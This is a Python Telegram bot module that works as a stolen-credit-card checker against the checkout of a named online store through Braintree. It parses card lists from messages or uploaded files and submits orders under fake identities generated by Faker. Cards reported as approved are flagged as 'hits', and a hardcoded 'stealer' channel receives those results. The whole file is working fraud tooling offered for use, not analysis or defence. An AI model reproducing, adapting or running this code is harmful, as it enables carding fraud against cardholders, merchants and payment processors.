import time
import asyncio
import re
import os
import json
import base64
import random
import string
import uuid
import httpx
from faker import Faker
from bs4 import BeautifulSoup
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# Initialize Faker
fake = Faker()

# Configuration
GATE_NAME = "Braintree - Plexaderm"
SITE_URL = "https://www.plexaderm.com"
CHECKOUT_URL = "https://plexaderm.com"
BRAINTREE_API = "https://payments.braintree-api.com/graphql"

# Limits
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

# Owner DM Link (clickable ㊕)
OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"

def random_name():
    return fake.first_name(), fake.last_name()

def random_email():
    return fake.email()

def random_phone():
    return fake.phone_number()[:10]

def random_address():
    return fake.street_address()

def random_city():
    return fake.city()

def random_zip():
    return fake.postcode()[:5]

def random_hex(length=32):
    return ''.join(random.choices('0123456789abcdef', k=length))

def random_guid():
    return f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}"

def get_card_type(card_number):
    first_four = card_number[:4]
    first_two = card_number[:2]
    first_one = card_number[0]
    if first_two in ['34', '37']:
        return 'American Express'
    if 51 <= int(first_two) <= 55:
        return 'Mastercard'
    if 2221 <= int(first_four) <= 2720:
        return 'Mastercard'
    if first_one == '4':
        return 'Visa'
    if first_four == '6011' or first_two == '65':
        return 'Discover'
    if 644 <= int(first_four[:3]) <= 649:
        return 'Discover'
    return 'Visa'

def extract_cards(text):
    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
    return re.findall(pattern, text)

def extract_jdialog_message(html):
    match = re.search(r'JDialog\(\s*[\'"]([^\'"]+)[\'"]', html)
    if match:
        return match.group(1)
    return None

def extract_error_message(html):
    match = re.search(r'<div class="errorMessage">(.*?)</div>', html, re.DOTALL)
    if match:
        return match.group(1).strip()
    return None

def extract_result_value(html):
    match = re.search(r'<input type="hidden" id="OrderValidationResult" value="([^"]+)"', html)
    if match:
        return match.group(1)
    return None

async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    """Send approved card to stealer channel (NO CC, NO BIN, NO Bank, NO Country)"""
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼𝗸 {time_taken:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
{SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=-1003627495953, text=stealer_msg, parse_mode="HTML", reply_markup=None)
    except Exception as e:
        print(f"[Stealer Error] {e}")

async def get_braintree_token(session, order_id):
    headers = {
        'authority': 'plexaderm.com',
        'accept': '*/*',
        'accept-language': 'tr-TR,tr;q=0.9',
        'referer': 'https://plexaderm.com/checkout/plexaderm/step4',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'x-requested-with': 'XMLHttpRequest',
    }
    params = {'orderId': order_id}
    try:
        resp = await session.get('https://plexaderm.com/data/GetBraintreeClientToken', params=params, headers=headers, timeout=15)
        data = resp.json()
        encoded_token = data.get('token')
        if encoded_token:
            decoded_token = base64.b64decode(encoded_token).decode('utf-8')
            token_data = json.loads(decoded_token)
            return token_data.get('authorizationFingerprint')
    except:
        pass
    return None

async def tokenize_card(session, auth_fingerprint, card_number, exp_month, exp_year, cvv):
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'authorization': f'Bearer {auth_fingerprint}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
    }
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "dropin2",
            "sessionId": random_guid()
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": card_number,
                    "expirationMonth": exp_month,
                    "expirationYear": exp_year,
                    "cvv": cvv
                },
                "options": {
                    "validate": False
                }
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    try:
        resp = await session.post(BRAINTREE_API, headers=headers, json=payload, timeout=15)
        return resp.json()
    except:
        return {}

async def call_braintree_api(fullcc):
    """Call Braintree API to check credit card"""
    try:
        card_line = fullcc.strip()
        card_parts = card_line.split('|')
        
        if len(card_parts) != 4:
            return "Error", "Invalid format", GATE_NAME, "0s"
        
        card_number, exp_month, exp_year, cvv = card_parts
        exp_month = exp_month.zfill(2)
        exp_year_full = exp_year if len(exp_year) == 4 else f"20{exp_year}"
        card_type = get_card_type(card_number)
        
        async with httpx.AsyncClient(timeout=60, follow_redirects=True) as session:
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7'
            })
            
            # Get initial cookies
            resp = await session.get(f'{SITE_URL}/', timeout=15)
            mvisit = session.cookies.get('mvisit')
            if not mvisit:
                mvisit = str(random.randint(10**15, 10**16-1))
            
            # Add to cart
            cart_headers = {
                'authority': 'www.plexaderm.com',
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': SITE_URL,
                'referer': f'{SITE_URL}/',
            }
            cart_data = {'items': [{'productId': 154562, 'quantity': 1}], 'withCartReset': False}
            cart_resp = await session.post(f'{SITE_URL}/api/cart/add', headers=cart_headers, json=cart_data, timeout=15)
            
            order_id = None
            if cart_resp.status_code == 200:
                order_id = cart_resp.json().get('orderNumber')
            
            # Step 1 - Get form data
            step1_url = f'{CHECKOUT_URL}/checkout/plexaderm/step1?m={mvisit}'
            step1_resp = await session.get(step1_url, timeout=15)
            soup = BeautifulSoup(step1_resp.text, 'html.parser')
            
            form_data = {}
            for inp in soup.find_all('input', type='hidden'):
                if inp.get('name') and inp.get('value'):
                    form_data[inp['name']] = inp['value']
            
            # Extract cart data
            current_cart_match = re.search(r'var ___currentCart = (\[.*?\]);', step1_resp.text, re.DOTALL)
            if current_cart_match:
                try:
                    current_cart = json.loads(current_cart_match.group(1))
                    for idx, item in enumerate(current_cart):
                        form_data[f'CartOffers[{idx}].OfferId'] = str(item['offerId'])
                        form_data[f'CartOffers[{idx}].OfferName'] = item['offerName']
                        form_data[f'CartOffers[{idx}].Quantity'] = str(item['quantity'])
                except:
                    pass
            
            # Extract page offers
            page_offers_match = re.search(r'var ___pageOffers = (\[.*?\]);', step1_resp.text, re.DOTALL)
            if page_offers_match:
                try:
                    page_offers = json.loads(page_offers_match.group(1))
                    for idx, item in enumerate(page_offers):
                        form_data[f'PageOffers[{idx}].OfferId'] = str(item['offerId'])
                        form_data[f'PageOffers[{idx}].OfferName'] = item['name']
                        form_data[f'PageOffers[{idx}].Quantity'] = '0'
                except:
                    pass
            
            # Set form data
            form_data['ContainsCreditCard'] = 'True'
            form_data['ContainsShippingData'] = 'True'
            form_data['ContainsBillingData'] = 'True'
            form_data['ContainsPromoCode'] = 'True'
            form_data['AutoDetectCreditCardType'] = 'True'
            form_data['HasFinalCheckoutButton'] = 'True'
            form_data['ContainsGift'] = 'False'
            form_data['ContainsAdditionalData'] = 'False'
            form_data['ContainsGiftCard'] = 'False'
            form_data['IsEmailConfirmationRequired'] = 'False'
            form_data['IsHidePayPalForMultiPay'] = 'False'
            form_data['ShowCheckoutConfirm'] = 'False'
            form_data['PaymentMethod'] = 'card'
            form_data['MailingListAgreement'] = 'true'
            form_data['SmsListAgreement'] = 'false'
            form_data['PromoCode'] = ''
            form_data['IsZipMismatchConfirmed'] = 'true'
            
            # Random user data
            first_name, last_name = random_name()
            email = random_email()
            phone = random_phone()
            address = random_address()
            city = random_city()
            zip_code = random_zip()
            
            form_data['ShippingFirstName'] = first_name
            form_data['ShippingLastName'] = last_name
            form_data['ShippingEmail'] = email
            form_data['ShippingPhone'] = phone
            form_data['ShippingAddress1'] = address
            form_data['ShippingAddress2'] = ''
            form_data['ShippingZip'] = zip_code
            form_data['ShippingCity'] = city
            form_data['ShippingStateId'] = '34'
            form_data['ShippingCountryId'] = '1'
            
            form_data['BillingSameAsShipping'] = 'true'
            form_data['BillingFirstName'] = first_name
            form_data['BillingLastName'] = last_name
            form_data['BillingEmail'] = email
            form_data['BillingPhone'] = phone
            form_data['BillingAddress1'] = address
            form_data['BillingAddress2'] = ''
            form_data['BillingZip'] = zip_code
            form_data['BillingCity'] = city
            form_data['BillingStateId'] = '34'
            form_data['BillingCountryId'] = '1'
            
            # Get order ID
            if not order_id:
                order_id_match = re.search(r'var ___orderId = "(\d+)"', step1_resp.text)
                if order_id_match:
                    order_id = order_id_match.group(1)
                else:
                    order_id = str(random.randint(10**7, 10**8-1))
            
            # Get Braintree token
            auth_fingerprint = await get_braintree_token(session, order_id)
            if not auth_fingerprint:
                return "Error", "Unable to get Braintree token", GATE_NAME, "0s"
            
            # Tokenize card
            tokenize_result = await tokenize_card(session, auth_fingerprint, card_number, exp_month, exp_year_full, cvv)
            payment_token = tokenize_result.get('data', {}).get('tokenizeCreditCard', {}).get('token')
            
            if not payment_token:
                return "Declined ❌", "Tokenization failed", GATE_NAME, "0s"
            
            # Prepare checkout data
            form_data['Token'] = payment_token
            form_data['CreditCardNumber'] = ''
            form_data['CreditCardMonth'] = exp_month
            form_data['CreditCardYear'] = exp_year_full
            form_data['CreditCardSecurityCode'] = ''
            form_data['CreditCardBin'] = card_number[:6]
            form_data['CardType'] = card_type
            
            # Step 2
            await session.get(f'{CHECKOUT_URL}/checkout/plexaderm/step2?un=1&m={mvisit}', timeout=15)
            
            # Step 4 - Submit order
            step4_url = f'{CHECKOUT_URL}/checkout/plexaderm/step4?m={mvisit}'
            post_data = {}
            for key, value in form_data.items():
                if isinstance(value, list):
                    for idx, v in enumerate(value):
                        post_data[f"{key}[{idx}]"] = v
                else:
                    post_data[key] = value
            
            checkout_headers = {
                'authority': 'plexaderm.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': CHECKOUT_URL,
                'referer': step1_url,
            }
            
            checkout_resp = await session.post(step4_url, headers=checkout_headers, data=post_data, timeout=30)
            
            # Extract response message from site
            msg = extract_jdialog_message(checkout_resp.text)
            if not msg:
                msg = extract_error_message(checkout_resp.text)
            if not msg:
                msg = extract_result_value(checkout_resp.text)
            if not msg:
                msg = "No response from server"
            
            # Determine status based on message content
            if "approved" in msg.lower() or "charged" in msg.lower() or "success" in msg.lower():
                return "Approved ✅", msg[:50], GATE_NAME, "0s"
            elif "decline" in msg.lower() or "declined" in msg.lower():
                return "Declined ❌", msg[:50], GATE_NAME, "0s"
            else:
                return "Unknown ❓", msg[:50], GATE_NAME, "0s"
                
    except Exception as e:
        return "Error", str(e)[:50], GATE_NAME, "0s"

# ═══════════════════════════════════════════════════════════════════════════════
# BOT COMMANDS (b3 / mb3 / tb3)
# ═══════════════════════════════════════════════════════════════════════════════

# --- SINGLE CHECK COMMAND (/b3) ---
@Client.on_message(filters.command("b3", [".", "/"]))
async def braintree_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        
        if checkall[0] == False:
            return
        role = checkall[1]
        
        getcc = await getmessage(message)
        
        if getcc == False:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /b3

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /b3 cc|mm|yyyy|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return
            
        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        gateway = GATE_NAME
        
        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)

        start = time.perf_counter()
        status, response, gateway, time_taken = await call_braintree_api(fullcc)
        
        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)

        if "Approved" in status or "✅" in status:
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, time.perf_counter() - start, first_name, role)

        # Make status bold and remove owner line
        display_status = f"<b>{status}</b>"

        finalresp = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        
        await setantispamtime(user_id)
        await deductcredit(user_id)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- MASS TEXT/REPLY COMMAND (/mb3) ---
@Client.on_message(filters.command("mb3", [".", "/"]))
async def braintree_mass_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: 
            return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            text_parts = message.text.split(maxsplit=1)
            if len(text_parts) > 1:
                ccs = extract_cards(text_parts[1])

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /mb3

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mb3 cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- TXT FILE COMMAND (/tb3) ---
@Client.on_message(filters.command("tb3", [".", "/"]))
async def braintree_txt_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: 
            return
        role = checkall[1]

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /tb3

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- SEQUENTIAL ONE-BY-ONE PROCESSING LOGIC (with progress, separate approved messages, declined summary) ---
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    total_cards = len(ccs)
    processed = 0
    approved_count = 0
    declined_count = 0
    gateway = GATE_NAME
    start_time = time.perf_counter()
    approved_cards = []

    # Initial progress message
    progress_text = f"""Braintree Charge
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total_cards}
Approved: 0
Declined: 0
Remaining: {total_cards}

Checked by: {first_name} ({role})"""

    progress_msg = await message.reply(progress_text, quote=True, parse_mode=enums.ParseMode.HTML)

    for idx, fullcc in enumerate(ccs, 1):
        processed = idx
        remaining = total_cards - processed

        status, response, gateway, time_taken = await call_braintree_api(fullcc)

        cc_num = fullcc.split('|')[0]
        getbin = await get_bin_details(cc_num)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        if "Approved" in status or "✅" in status:
            approved_count += 1
            response_status = "APPROVED ✅"
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc,
                "status": status,
                "response": response,
                "gateway": gateway,
                "brand": f"{brand}_{type_}-{level}",
                "bank": bank,
                "country": country,
                "flag": flag,
                "time": card_time
            })
            # Send to stealer (no CC/BIN)
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, card_time, first_name, role)
        else:
            declined_count += 1
            response_status = "DECLINED ❌"

        # Update progress message
        try:
            await Client.edit_message_text(
                message.chat.id,
                progress_msg.id,
                f"""Braintree Charge
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total_cards}
Approved: {approved_count}
Declined: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})""",
                parse_mode=enums.ParseMode.HTML
            )
        except:
            pass

        await asyncio.sleep(0.5)

    # Delete progress message
    await progress_msg.delete()

    # Send each approved card as separate message (full details, no owner line, clickable checked by)
    for card in approved_cards:
        display_status = f"<b>{card['status']}</b>"
        approved_msg = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)

    # Send declined summary (no owner line)
    if approved_count > 0:
        declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅs ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        for card in declined_list[:15]:
            declined_summary += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            declined_summary += f"\n... and {declined_count - 15} more declined cards"
        declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total_cards}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})"""
        await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"""❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅs

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total_cards}
❌ All Declined: {declined_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})""",
            quote=True,
            parse_mode=enums.ParseMode.HTML
        )

    await setantispamtime(user_id)
